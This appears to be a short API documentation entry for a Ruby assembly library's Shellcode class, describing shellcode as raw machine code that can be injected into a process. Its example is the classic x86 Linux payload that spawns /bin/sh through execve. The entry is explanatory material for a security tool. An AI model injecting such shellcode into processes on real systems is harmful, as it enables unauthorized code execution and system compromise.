Overview

Represents Shellcode. Shellcode is like an Assembly Program, but assembles into raw machine code which can be injected into a process.

ASM::Shellcode.new do
  xor   eax,  eax
  push  eax
  push  0x68732f2f
  push  0x6e69622f
  mov   esp,  ebx
  push  eax
  push  ebx
  mov   esp,  ecx
  xor   edx,  edx
  mov   0xb,  al
  int   0x80
end
